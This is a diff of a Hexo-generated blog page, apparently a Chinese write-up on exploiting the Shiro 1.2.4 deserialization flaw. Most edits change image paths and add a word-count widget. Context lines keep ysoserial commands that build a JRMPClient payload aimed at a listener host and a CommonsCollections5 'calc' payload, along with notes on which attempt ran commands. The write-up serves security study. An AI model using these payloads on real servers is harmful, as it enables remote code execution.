-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322012002559.png" alt="image-20200322012002559"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322012002559.png" class="" title="image-20200322012002559">
+
 <p>我本地测试也未成功，参考其他师傅文章</p>
 <blockquote>
 <p>具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的。</p>
@@ -462,12 +539,18 @@
 
 <p>继续尝试使用JRMP的方法攻击</p>
 <p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient &quot;x.x.x.x:12345&quot;|base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322135132673.png" alt="image-20200322135132673"></p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133230697.png" alt="image-20200322133230697"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322135132673.png" class="" title="image-20200322135132673">
+
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133230697.png" class="" title="image-20200322133230697">
+
 <p>服务器开启监听并发送payload</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133300379.png" alt="image-20200322133300379"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133300379.png" class="" title="image-20200322133300379">
+
 <p>这次确实成功执行命令</p>
-<p><img src="/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133333045.png" alt="image-20200322133333045"></p>
+<img src="/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200322133333045.png" class="" title="image-20200322133333045">
+
+
+
 <p>那么再尝试直接用CommonsCollections5 gadget</p>
 <p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;calc&quot; |base64 |sed &#39;:label;N;s/\n//;b label&#39;</code></p>
 <p>失败，这次失败的原因才是如上文</p>
@@ -531,6 +614,20 @@
     </span>
     <span class="author" itemprop="copyrightHolder">淚笑</span>
   </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">78k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:43</span>
+  </span>
+</div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
